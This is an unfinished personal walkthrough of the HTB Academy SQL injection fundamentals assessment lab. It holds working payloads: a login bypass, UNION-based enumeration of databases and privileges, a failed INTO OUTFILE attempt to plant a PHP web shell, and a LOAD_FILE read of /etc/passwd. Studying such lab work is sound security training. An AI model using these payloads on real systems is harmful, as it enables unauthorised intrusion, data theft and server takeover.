---
title: HTB Academy - SQL Injection Fundamentals - Assessment Writeup
draft: 
tags:
  - SQLInjection
  - SQLi
---
![[Screenshot 2025-03-09 at 1.00.28 PM.png]]

Presented with a login page immediately should have us checking to see if we can work around this. First we want to test if we have a first order or second order SQLi

seeing a login and based on the module going over the logins I feel the urge to attack it with the following:

```sql
' OR '1'='1'; -- 
```

Before I do though what we want to know is if this is passing data through the URL or another method. if it is passing data through the URL then we will want to possibly encode our injection.

After passing a simple single quote I get the following:
![[Screenshot 2025-03-09 at 1.10.11 PM.png]]

We can see that we are not passing data through the URL so we will want to force a TRUE value to let us get past this gate. to do this we do the following:

```sql
' OR '1'='1'; -- 
```

If for some reason you are coming across this and you are not me... or actually even if you are me. if this confuses you then you should really refresh on the module around it.

Now we are presented with the following page:
![[Screenshot 2025-03-09 at 1.14.43 PM.png]]

Similar to what we saw in the modules where we grabbed data back. If we recalled and our notes were solid our first step should be playing around with the search to find a currect value to pass it followed by finding out how many columns this table returns.

We can do this with `ORDER BY` or with `UNION` do to ease I am going to use Union

Playing around I found out that `January` was a passable parameter and followed it with this query

```sql
January' UNION SELECT 1,2,3,4,5,6; -- -
```
note: the final - is to represent I added a space

what we are doing here is adding a correct parameter, closing it with a single quote and having a union to see if we meet the same amount of columns back, ending the query with the semicolon and commenting out the rest of the query if there is one.

What we get back is the following:
![[Screenshot 2025-03-09 at 1.26.26 PM.png]]

Success! This query works we just need to lower the amount of columns until we succeed. I started with six since there were 4 just to make sure we didn't have to go up. 

Next i try the following query:
```sql
January' UNION SELECT 1,2,3,4,5; -- -
```
Note: final dash is to show we are using a space.

Success! we now can see our table starting at 2 most likely do to the return omitting the key column. Picture below:

![[Screenshot 2025-03-09 at 1.31.17 PM.png]]

From here it would be best practices to see what kind of DB we are on and we can do that in a multitude of ways. However, we already know we are on a Maria DB server due to errors we saw so we will skip this step.

the next step then should be to see what databases we have access to. We can do this by replacing one of the numbers with a dot notation by doing the following command:

```sql
January' UNION SELECT 1,schema_name,3,4,5 FROM INFORMATION_SCHEMA.SCHEMATA;-- -
```
Note: final - is to show there is a space

We get the following from our query:

![[Screenshot 2025-03-09 at 1.45.58 PM.png]]

Looks like we have two databases worth something. `ilfreight` and `backup` Now I would assume we are in the `ilfreight` database but you never know. So lets see what database we are in.

lets do this by altering the query we had above with `database()`

```sql
January' UNION SELECT 1,database(),3,4,5 FROM INFORMATION_SCHEMA.SCHEMATA;-- -
```

We see we are indeed in the `ilfreight` database

![[Screenshot 2025-03-09 at 1.49.25 PM.png]]

What we are doing is not necessarily needed but its good practice regardless.


Now that we know what databases exist and what database we are currently in we could see what tables and columns live in these databases but I am going to skip this step and go straight to seeing not who our user is but to see what our privileges are. If we don't have the right privileges  we will go back.

```sql
January' UNION SELECT 1,super_priv,3,4,5 FROM mysql.user;-- -
```

With this query we get back the following response:

![[Screenshot 2025-03-09 at 1.56.24 PM.png]]

The `Y` indicates we have super privileges. 

Since my kids are getting restless of me writing this and doing the lab at the same time I am going to get straight to making the webshell


```sql
January' union select "",'<?php system($_REQUEST[0]); ?>', "", "", "" into outfile '/var/www/html/shell.php';-- -
```

OH NOOOOOOOOO. I was denied the ability to write a file as we can see below:
![[Screenshot 2025-03-09 at 2.01.41 PM.png]]

Well if I can not write a file maybe I can just read it. Lets try the following

```sql
January' UNION SELECT 1,LOAD_FILE("/etc/passwd"),3,4,5;-- -
```

## Stopping here for now until I can do this later

- Note to future self
	- Check current user
	- Check permissions of current user
	- Se where I might be able to place a webshell